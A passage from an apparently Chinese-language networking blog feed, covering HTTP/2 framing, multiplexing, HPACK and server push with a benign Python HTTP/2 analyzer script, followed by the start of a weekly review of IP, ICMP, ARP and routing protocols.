class="hljs-selector-attr">[==响应==]</span><br><br>优势：<br>- 只需一个TCP连接<br>- 减少连接开销<br>- 并行传输多个资源<br>- 避免队头阻塞<br><br>流的概念：<br>┌─────────────────────────────────────────┐<br>│  单个HTTP/<span class="hljs-number">2</span>连接                          │<br>│  ├─ 流<span class="hljs-number">1</span> (Stream <span class="hljs-number">1</span>)                      │<br>│  │   ├─ HEADERS 帧                      │<br>│  │   ├─ DATA 帧 <span class="hljs-number">1</span>                       │<br>│  │   └─ DATA 帧 <span class="hljs-number">2</span>                       │<br>│  ├─ 流<span class="hljs-number">3</span> (Stream <span class="hljs-number">3</span>)                      │<br>│  │   ├─ HEADERS 帧                      │<br>│  │   └─ DATA 帧                         │<br>│  └─ 流<span class="hljs-number">5</span> (Stream <span class="hljs-number">5</span>)                      │<br>│      └─ HEADERS 帧                      │<br>└─────────────────────────────────────────┘<br><br>流的生命周期：<br>idle → open → half-closed → closed<br></code></pre></td></tr></table></figure><h3 id="2-4-头部压缩（HPACK）"><a href="#2-4-头部压缩（HPACK）" class="headerlink" title="2.4 头部压缩（HPACK）"></a>2.4 头部压缩（HPACK）</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HPACK压缩原理：<br><br>1. 静态表（预定义的常用头部）<br>┌─────┬──────────────────┬─────────────────┐<br>│ 索引│  头部名称        │  值              │<br>├─────┼──────────────────┼─────────────────┤<br>│  1  │ :authority       │                 │<br>│  2  │ :method          │ GET             │<br>│  3  │ :method          │ POST            │<br>│  4  │ :path            │ /               │<br>│  5  │ :path            │ /index.html     │<br>│  6  │ :scheme          │ http            │<br>│  7  │ :scheme          │ https           │<br>│  8  │ :status          │ 200             │<br>│ ... │ ...              │ ...             │<br>└─────┴──────────────────┴─────────────────┘<br><br>2. 动态表（连接期间建立的表）<br><span class="hljs-code">   - 记录已发送的头部</span><br><span class="hljs-code">   - 后续只发送索引</span><br><span class="hljs-code">   - 大幅减少重复数据</span><br><br>示例：<br>第一个请求：<br><span class="hljs-meta">:method:</span> GET<br><span class="hljs-meta">:path:</span> /index.html<br><span class="hljs-meta">:scheme:</span> https<br>user-agent: Mozilla/5.0...<br>cookie: session=abc123...<br><br>第二个请求（压缩后）：<br><span class="hljs-meta">:method:</span> GET          → 索引2（从静态表）<br><span class="hljs-meta">:path:</span> /style.css     → 新值<br><span class="hljs-meta">:scheme:</span> https        → 索引7（从静态表）<br>user-agent: ...       → 索引62（从动态表）<br>cookie: ...           → 索引63（从动态表）<br><br>压缩效果：<br><span class="hljs-bullet">- </span>首次请求：500字节<br><span class="hljs-bullet">- </span>后续请求：50字节<br><span class="hljs-bullet">- </span>压缩率：90%<br></code></pre></td></tr></table></figure><h3 id="2-5-服务器推送"><a href="#2-5-服务器推送" class="headerlink" title="2.5 服务器推送"></a>2.5 服务器推送</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">服务器推送流程：<br><br>传统HTTP/<span class="hljs-number">1.1</span>：<br>客户端: GET /<span class="hljs-keyword">index</span>.html<br>服务器: → 返回<span class="hljs-keyword">index</span>.html<br>客户端: (解析HTML，发现需要style.css)<br>客户端: GET /style.css<br>服务器: → 返回style.css<br>客户端: (解析HTML，发现需要script.js)<br>客户端: GET /script.js<br>服务器: → 返回script.js<br><br>总往返次数：<span class="hljs-number">6</span>次（<span class="hljs-number">3</span>个请求-响应）<br><br>HTTP/<span class="hljs-number">2</span>服务器推送：<br>客户端: GET /<span class="hljs-keyword">index</span>.html<br>服务器: → PUSH_PROMISE /style.css<br>服务器: → PUSH_PROMISE /script.js<br>服务器: → 返回<span class="hljs-keyword">index</span>.html<br>服务器: → 返回style.css (推送)<br>服务器: → 返回script.js (推送)<br><br>总往返次数：<span class="hljs-number">2</span>次（<span class="hljs-number">1</span>个请求，服务器主动推送其他资源）<br><br>推送示例：<br>┌────────────────────────────────────────┐<br>│  客户端请求                             │<br>│  GET /<span class="hljs-keyword">index</span>.html HTTP/<span class="hljs-number">2</span>                │<br>└────────────────────────────────────────┘<br>         ↓<br>┌────────────────────────────────────────┐<br>│  服务器响应                             │<br>│  <span class="hljs-number">1</span>. PUSH_PROMISE                       │<br>│     :<span class="hljs-keyword">method</span>: GET                       │<br>│     :path: /style.css                  │<br>│                                        │<br>│  <span class="hljs-number">2</span>. HEADERS (<span class="hljs-keyword">index</span>.html的响应头)       │<br>│  <span class="hljs-number">3</span>. DATA (<span class="hljs-keyword">index</span>.html的内容)            │<br>│                                        │<br>│  <span class="hljs-number">4</span>. HEADERS (style.css的响应头)        │<br>│  <span class="hljs-number">5</span>. DATA (style.css的内容 - 推送)      │<br>└────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="3-实战项目：HTTP-2客户端分析器"><a href="#3-实战项目：HTTP-2客户端分析器" class="headerlink" title="3. 实战项目：HTTP&#x2F;2客户端分析器"></a>3. 实战项目：HTTP&#x2F;2客户端分析器</h2><h3 id="3-1-项目需求"><a href="#3-1-项目需求" class="headerlink" title="3.1 项目需求"></a>3.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能：<br><span class="hljs-bullet">1.</span> 发送HTTP/2请求<br><span class="hljs-bullet">2.</span> 分析HTTP/2帧结构<br><span class="hljs-bullet">3.</span> 对比HTTP/1.1和HTTP/2性能<br><span class="hljs-bullet">4.</span> 展示多路复用效果<br></code></pre></td></tr></table></figure><h3 id="3-2-代码实现"><a href="#3-2-代码实现" class="headerlink" title="3.2 代码实现"></a>3.2 代码实现</h3><pre><code class="language-python"># day28_http2_analyzer.py# 功能：HTTP/2协议分析器import sslimport socketfrom typing import Dict, List, Tupleimport time# 注意：需要安装 hyper 库来处理HTTP/2# pip install hypertry:    from hyper import HTTPConnection    from hyper.common.headers import HTTPHeaderMapexcept ImportError:    print(&quot;请先安装hyper库: pip install hyper&quot;)    exit(1)class HTTP2Analyzer:    &quot;&quot;&quot;    HTTP/2协议分析器    功能：        1. 发送HTTP/2请求        2. 分析响应性能        3. 对比HTTP/1.1和HTTP/2        4. 演示多路复用    &quot;&quot;&quot;    def __init__(self, host: str, port: int = 443):        &quot;&quot;&quot;        初始化HTTP/2连接        参数：            host: 目标主机            port: 端口（默认443 for HTTPS）        &quot;&quot;&quot;        self.host = host        self.port = port        self.conn = None    def connect(self):        &quot;&quot;&quot;        建立HTTP/2连接        工作原理：            1. 创建SSL/TLS连接            2. 通过ALPN协商HTTP/2            3. 建立HTTP/2连接        &quot;&quot;&quot;        try:            print(f&quot;\n正在连接到 {self.host}:{self.port}...&quot;)            self.conn = HTTPConnection(self.host, self.port)            print(&quot;✅ HTTP/2连接建立成功&quot;)            return True        except Exception as e:            print(f&quot;❌ 连接失败: {e}&quot;)            return False    def request_single(self, path: str = &#39;/&#39;) -&gt; Tuple[float, int]:        &quot;&quot;&quot;        发送单个HTTP/2请求        参数：            path: 请求路径        返回值：            (响应时间, 响应大小)        &quot;&quot;&quot;        try:            start_time = time.time()            # 发送GET请求            stream_id = self.conn.request(&#39;GET&#39;, path)            # 获取响应            response = self.conn.get_response(stream_id)            # 读取响应体            body = response.read()            end_time = time.time()            elapsed = (end_time - start_time) * 1000  # 转换为毫秒            print(f&quot;  {path}&quot;)            print(f&quot;    状态码: {response.status}&quot;)            print(f&quot;    响应时间: {elapsed:.2f}ms&quot;)            print(f&quot;    响应大小: {len(body)} bytes&quot;)            return elapsed, len(body)        except Exception as e:            print(f&quot;  ❌ 请求失败: {e}&quot;)            return 0, 0    def request_multiple(self, paths: List[str]) -&gt; Dict[str, Tuple[float, int]]:        &quot;&quot;&quot;        并发发送多个HTTP/2请求（演示多路复用）        参数：            paths: 路径列表        返回值：            {路径: (响应时间, 响应大小)}        工作原理：            HTTP/2允许在单个连接上并发多个请求            不需要等待前一个请求完成        &quot;&quot;&quot;        results = {}        stream_ids = {}        print(f&quot;\n正在并发请求 {len(paths)} 个资源...&quot;)        # 第一步：发送所有请求（不等待响应）        start_time = time.time()        for path in paths:            try:                stream_id = self.conn.request(&#39;GET&#39;, path)                stream_ids[stream_id] = path                print(f&quot;  发送请求: {path} (流ID: {stream_id})&quot;)            except Exception as e:                print(f&quot;  ❌ 发送请求失败 {path}: {e}&quot;)        # 第二步：接收所有响应        for stream_id, path in stream_ids.items():            try:                response = self.conn.get_response(stream_id)                body = response.read()                elapsed = (time.time() - start_time) * 1000                results[path] = (elapsed, len(body))                print(f&quot;  接收响应: {path}&quot;)                print(f&quot;    状态码: {response.status}&quot;)                print(f&quot;    大小: {len(body)} bytes&quot;)            except Exception as e:                print(f&quot;  ❌ 接收响应失败 {path}: {e}&quot;)                results[path] = (0, 0)        total_time = (time.time() - start_time) * 1000        print(f&quot;\n总耗时: {total_time:.2f}ms&quot;)        return results    def analyze_headers(self):        &quot;&quot;&quot;        分析HTTP/2头部压缩效果        演示：            发送多个请求，观察头部压缩带来的性能提升        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/2头部压缩分析&quot;)        print(&quot;=&quot;*60)        paths = [&#39;/&#39;, &#39;/about&#39;, &#39;/contact&#39;]        for i, path in enumerate(paths, 1):            print(f&quot;\n请求 {i}: {path}&quot;)            self.request_single(path)        print(&quot;&quot;&quot;头部压缩说明：- 第一个请求发送完整头部- 后续请求只发送头部索引- HPACK算法压缩率可达90%        &quot;&quot;&quot;)    def compare_http_versions(self):        &quot;&quot;&quot;        对比HTTP/1.1和HTTP/2性能        说明：            这是一个简化的对比演示            实际性能差异需要真实环境测试        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/1.1 vs HTTP/2 性能对比&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;假设场景：加载一个网页，包含：- 1个HTML文件- 3个CSS文件- 5个JS文件- 10个图片文件共19个资源HTTP/1.1（6个并发连接）：┌────────────────────────────────────────┐│ 连接1: [HTML]                          ││ 连接2: [CSS1][CSS2][CSS3]              ││ 连接3: [JS1][JS2]                      ││ 连接4: [JS3][JS4][JS5]                 ││ 连接5: [IMG1][IMG2][IMG3][IMG4]        ││ 连接6: [IMG5][IMG6][IMG7][IMG8]        ││ 等待队列: [IMG9][IMG10]                │└────────────────────────────────────────┘总耗时：约800ms（估算）- 6个TCP连接建立：6 × 100ms = 600ms- 资源下载：200msHTTP/2（单个连接，多路复用）：┌────────────────────────────────────────┐│ 单个连接:                               ││ [HTML][CSS1][CSS2][CSS3][JS1][JS2]...  ││ 所有19个资源并行传输                    │└────────────────────────────────────────┘总耗时：约150ms（估算）- 1个TCP连接建立：100ms- 资源下载（并行）：50ms性能提升：(800-150)/800 = 81.25%        &quot;&quot;&quot;)    def demonstrate_multiplexing(self):        &quot;&quot;&quot;        演示多路复用        工作原理：            在单个TCP连接上，同时发送多个请求            不需要等待前一个请求完成        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; 多路复用演示&quot;)        print(&quot;=&quot;*60)        # 模拟请求多个资源        paths = [            &#39;/&#39;,            &#39;/favicon.ico&#39;,            &#39;/robots.txt&#39;        ]        print(&quot;\n方式1：顺序请求（模拟HTTP/1.1）&quot;)        print(&quot;-&quot; * 60)        total_sequential = 0        for path in paths:            elapsed, size = self.request_single(path)            total_sequential += elapsed        print(f&quot;\n顺序请求总耗时: {total_sequential:.2f}ms&quot;)        # 重新连接        self.connect()        print(&quot;\n方式2：并发请求（HTTP/2多路复用）&quot;)        print(&quot;-&quot; * 60)        results = self.request_multiple(paths)        print(f&quot;&quot;&quot;对比结果：- 顺序请求: {total_sequential:.2f}ms- 并发请求: {max(r[0] for r in results.values()):.2f}ms- 性能提升: {(1 - max(r[0] for r in results.values())/total_sequential)*100:.1f}%说明：HTTP/2多路复用允许多个请求/响应并行传输      避免了队头阻塞，显著提升性能        &quot;&quot;&quot;)    def close(self):        &quot;&quot;&quot;关闭连接&quot;&quot;&quot;        if self.conn:            self.conn.close()            print(&quot;\n连接已关闭&quot;)class SimpleHTTP2Demo:    &quot;&quot;&quot;    简化的HTTP/2概念演示    （不依赖外部库，纯Python实现概念演示）    &quot;&quot;&quot;    @staticmethod    def show_frame_structure():        &quot;&quot;&quot;        展示HTTP/2帧结构        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/2帧结构演示&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;HTTP/2帧格式：┌──────────────────────────────────────────────────────┐│  +-----------------------------------------------+   ││  |                 Length (24)                   |   ││  +---------------+---------------+---------------+   ││  |   Type (8)    |   Flags (8)   |                   ││  +-+-------------+---------------+------...------+   ││  |R|                 Stream ID (31)               |   ││  +=+===========================================+   ││  |                   Frame Payload               |   ││  +-----------------------------------------------+   │└──────────────────────────────────────────────────────┘字段说明：- Length: 24位，帧负载的长度- Type: 8位，帧类型  * 0x0: DATA  * 0x1: HEADERS  * 0x2: PRIORITY  * 0x3: RST_STREAM  * 0x4: SETTINGS  * 0x5: PUSH_PROMISE  * 0x6: PING  * 0x7: GOAWAY  * 0x8: WINDOW_UPDATE  * 0x9: CONTINUATION- Flags: 8位，特定于帧类型的标志- R: 1位，保留位- Stream ID: 31位，流标识符示例帧（HEADERS帧）：┌──────────────────────────────────────┐│ Length: 0x000012 (18字节)            ││ Type: 0x01 (HEADERS)                 ││ Flags: 0x04 (END_HEADERS)            ││ Stream ID: 0x00000001                ││ Payload: (压缩的头部数据)            │└──────────────────────────────────────┘        &quot;&quot;&quot;)    @staticmethod    def show_stream_states():        &quot;&quot;&quot;        展示流状态转换        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/2流状态转换&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;流的生命周期：                        +--------+                        | idle   |  初始状态                        +--------+                             |                             | 发送/接收 HEADERS                             |                             v                        +--------+                        | open   |  打开状态（双向通信）                        +--------+                             |                ┌────────────┴────────────┐                |                         |                | 发送 END_STREAM         | 接收 END_STREAM                v                         v          +-------------+           +-------------+          | half-closed |           | half-closed |          | (local)     |           | (remote)    |          +-------------+           +-------------+                |                         |                | 接收 END_STREAM         | 发送 END_STREAM                └────────────┬────────────┘                             v                        +--------+                        | closed |  关闭状态                        +--------+状态说明：- idle: 未使用的流- open: 活跃的流，可以双向发送帧- half-closed: 一端已关闭，只能单向通信- closed: 流已关闭，不能再发送帧        &quot;&quot;&quot;)    @staticmethod    def show_hpack_example():        &quot;&quot;&quot;        展示HPACK压缩示例        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HPACK头部压缩示例&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;场景：发送两个相似的HTTP请求请求1（未压缩）：:method: GET:scheme: https:path: /index.html:authority: www.example.comuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)accept: text/html,application/xhtml+xmlaccept-language: zh-CN,zh;q=0.9accept-encoding: gzip, deflate, brcookie: session_id=abc123; user_id=456原始大小：约 280 字节请求1（HPACK压缩后）：使用索引编码：  :method: GET       → 2 (静态表索引)  :scheme: https     → 7 (静态表索引)  :path: /index.html → 动态编码  :authority: ...    → 动态编码  user-agent: ...    → 动态编码并加入动态表  accept: ...        → 动态编码并加入动态表  其他头部...        → 动态编码并加入动态表压缩后大小：约 150 字节压缩率：46%---请求2（利用动态表）：:method: GET           → 2 (静态表):scheme: https         → 7 (静态表):path: /style.css      → 动态编码（只有路径不同）:authority: ...        → 62 (动态表索引)user-agent: ...        → 63 (动态表索引)accept: ...            → 64 (动态表索引)accept-language: ...   → 65 (动态表索引)accept-encoding: ...   → 66 (动态表索引)cookie: ...            → 67 (动态表索引)压缩后大小：约 30 字节压缩率：89%动态表内容：┌───┬──────────────────┬─────────────────────┐│索引│  名称            │  值                  │├───┼──────────────────┼─────────────────────┤│62 │ :authority       │ www.example.com     ││63 │ user-agent       │ Mozilla/5.0...      ││64 │ accept           │ text/html,...       ││65 │ accept-language  │ zh-CN,zh;q=0.9      ││66 │ accept-encoding  │ gzip, deflate, br   ││67 │ cookie           │ session_id=abc123...│└───┴──────────────────┴─────────────────────┘总结：- 第一个请求建立动态表- 后续请求复用动态表- 压缩率随着请求增加而提高        &quot;&quot;&quot;)def main():    &quot;&quot;&quot;主程序&quot;&quot;&quot;    print(&quot;&quot;&quot;    ╔══════════════════════════════════════════════════════════╗    ║       HTTP/2协议分析器 v1.0                               ║    ║       HTTP/2 Protocol Analyzer                           ║    ╚══════════════════════════════════════════════════════════╝    &quot;&quot;&quot;)    # 首先展示概念演示（不需要网络连接）    demo = SimpleHTTP2Demo()    print(&quot;\n【第一部分：HTTP/2基础概念】&quot;)    demo.show_frame_structure()    input(&quot;\n按Enter继续...&quot;)    demo.show_stream_states()    input(&quot;\n按Enter继续...&quot;)    demo.show_hpack_example()    input(&quot;\n按Enter继续...&quot;)    # 实际HTTP/2连接演示（需要网络）    print(&quot;\n【第二部分：HTTP/2实际连接演示】&quot;)    choice = input(&quot;\n是否进行实际HTTP/2连接测试？(y/n): &quot;).strip().lower()    if choice == &#39;y&#39;:        # 使用支持HTTP/2的网站进行测试        host = input(&quot;请输入测试网站（默认：www.google.com）: &quot;).strip()        if not host:            host = &quot;www.google.com&quot;        analyzer = HTTP2Analyzer(host)        if analyzer.connect():            try:                # 单个请求                print(&quot;\n1. 单个请求测试&quot;)                analyzer.request_single(&#39;/&#39;)                input(&quot;\n按Enter继续...&quot;)                # 多路复用演示                print(&quot;\n2. 多路复用演示&quot;)                analyzer.demonstrate_multiplexing()                input(&quot;\n按Enter继续...&quot;)                # 性能对比                print(&quot;\n3. 性能对比&quot;)                analyzer.compare_http_versions()            except Exception as e:                print(f&quot;\n测试过程出错: {e}&quot;)            finally:                analyzer.close()    else:        print(&quot;\n跳过实际连接测试&quot;)    print(&quot;&quot;&quot;    \n总结：    HTTP/2通过以下技术显著提升了Web性能：    1. 二进制分帧 - 更高效的传输    2. 多路复用 - 消除队头阻塞    3. 头部压缩 - 减少带宽消耗    4. 服务器推送 - 主动推送资源    5. 请求优先级 - 优化加载顺序    下一节我们将学习HTTP/3和QUIC协议！    &quot;&quot;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>27天：第四周综合实战</title>
    <link href="/2025/11/10/27%E5%A4%A9%EF%BC%9A%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/27%E5%A4%A9%EF%BC%9A%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="第27天：第四周综合实战"><a href="#第27天：第四周综合实战" class="headerlink" title="第27天：第四周综合实战"></a>第27天：第四周综合实战</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>回顾第四周核心知识点</li><li>完成综合实战项目</li><li>学习网络排错方法</li><li>掌握性能优化技巧</li><li>总结本周学习成果</li></ul><hr><h2 id="1-本周知识回顾"><a href="#1-本周知识回顾" class="headerlink" title="1. 本周知识回顾"></a>1. 本周知识回顾</h2><h3 id="1-1-核心协议总结"><a href="#1-1-核心协议总结" class="headerlink" title="1.1 核心协议总结"></a>1.1 核心协议总结</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros">第四周学习的核心协议：<br><br>┌─────────────┬──────────────┬─────────────────────────┐<br>│   协议      │    层次      │        主要功能         │<br>├─────────────┼──────────────┼─────────────────────────┤<br>│<span class="hljs-built_in"> IP </span>(IPv4)   │   网络层     │ 寻址、分片、路由        │<br>│<span class="hljs-built_in"> IPv6 </span>       │   网络层     │ 下一代IP协议            │<br>│ ICMP        │   网络层     │ 错误报告、诊断          │<br>│ ARP         │   链路层     │<span class="hljs-built_in"> IP </span>→ MAC地址映射        │<br>│<span class="hljs-built_in"> RIP </span>        │   应用层     │ 距离矢量路由协议        │<br>│<span class="hljs-built_in"> OSPF </span>       │   应用层     │ 链路状态路由协议        │<br>└─────────────┴──────────────┴─────────────────────────┘<br><br>协议关系图：<br><br>应用层<br>   ↓<br>传输层 (TCP/UDP)<br>   ↓<br>网络层 ┌─────────────────────────────┐<br>       │<span class="hljs-built_in"> IP </span>(路由、寻址)              │<br>       │   ↓                         │<br>       │ ICMP (诊断、错误报告)        │<br>       │ RIP<span class="hljs-built_in">/OSPF </span>(动态路由)         │<br>       └─────────────────────────────┘<br>   ↓<br>链路层 ┌─────────────────────────────┐<br>       │ ARP (地址解析)               │<br>       │<span class="hljs-built_in"> Ethernet </span>(以太网帧)          │<br>       └─────────────────────────────┘<br>   ↓<br>物理层<br></code></pre></td></tr></table></figure><h3 id="1-2-重点知识点"><a href="#1-2-重点知识点" class="headerlink" title="1.2 重点知识点"></a>1.2 重点知识点</h3><p><strong>IP协议</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4地址：<br><span class="hljs-bullet">- </span>32位，点分十进制<br><span class="hljs-bullet">- </span>地址分类：A/B/C/D/E<br><span class="hljs-bullet">- </span>私有地址：10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16<br><span class="hljs-bullet">- </span>子网划分：VLSM, CIDR<br><br>IPv6地址：<br><span class="hljs-bullet">- </span>128位，冒号十六进制<br><span class="hljs-bullet">- </span>压缩规则：省略前导零，::表示连续零<br><span class="hljs-bullet">- </span>地址类型：单播、任播、多播<br><span class="hljs-bullet">- </span>无NAT，端到端连接<br><br>IP路由：<br><span class="hljs-bullet">- </span>最长前缀匹配<br><span class="hljs-bullet">- </span>直连路由、静态路由、动态路由<br><span class="hljs-bullet">- </span>路由表查找过程<br></code></pre></td></tr></table></figure><p><strong>ICMP协议</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">主要用途：<br><span class="hljs-bullet">-</span> ping: 回显请求/应答 (Type 8/0)<br><span class="hljs-bullet">-</span> traceroute: 利用TTL超时 (Type 11)<br><span class="hljs-bullet">-</span> 目标不可达 (Type 3)<br><br>ping工作流程：<br><span class="hljs-bullet">1.</span> 发送ICMP Echo Request<br><span class="hljs-bullet">2.</span> 接收ICMP Echo Reply<br><span class="hljs-bullet">3.</span> 计算RTT（往返时间）<br><span class="hljs-bullet">4.</span> 统计丢包率<br><br>traceroute原理：<br><span class="hljs-bullet">1.</span> TTL=1发送，第1跳返回超时<br><span class="hljs-bullet">2.</span> TTL=2发送，第2跳返回超时<br><span class="hljs-bullet">3.</span> ...直到到达目标<br></code></pre></td></tr></table></figure><p><strong>ARP协议</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">工作流程：<br><span class="hljs-bullet">1.</span> 查ARP缓存 → 有则使用<br><span class="hljs-bullet">2.</span> 广播ARP请求：&quot;谁是X.X.X.X？&quot;<br><span class="hljs-bullet">3.</span> 目标主机单播ARP应答：&quot;我是，MAC是...&quot;<br><span class="hljs-bullet">4.</span> 更新ARP缓存<br><span class="hljs-bullet">5.</span> 发送数据<br><br>ARP安全：<br><span class="hljs-bullet">-</span> ARP欺骗/缓存投毒<br><span class="hljs-bullet">-</span> 中间人攻击<br><span class="hljs-bullet">-</span> 防御：DAI, 静态ARP, 加密协议<br></code></pre></td></tr></table></figure><p><strong>路由协议</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">静态路由：<br><span class="hljs-bullet">- </span>手动配置<br><span class="hljs-bullet">- </span>不适应变化<br><span class="hljs-bullet">- </span>适合小型网络<br><br>动态路由：<br>┌──────────────┬──────────────┬──────────────┐<br>│   协议       │     RIP      │    OSPF      │<br>├──────────────┼──────────────┼──────────────┤<br>│ 类型         │  距离矢量    │  链路状态    │<br>│ 度量         │  跳数        │  Cost(带宽)  │<br>│ 最大跳数     │  15          │  无限制      │<br>│ 收敛速度     │  慢          │  快          │<br>│ 适用场景     │  小型网络    │  大型网络    │<br>└──────────────┴──────────────┴──────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="2-综合实战项目：网络诊断平台"><a href="#2-综合实战项目：网络诊断平台" class="headerlink" title="2. 综合实战项目：网络诊断平台"></a>2. 综合实战项目：网络诊断平台</h2><h3 id="2-1-项目需求"><a href="#2-1-项目需求" class="headerlink" title="2.1 项目需求"></a>2.1 项目需求</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 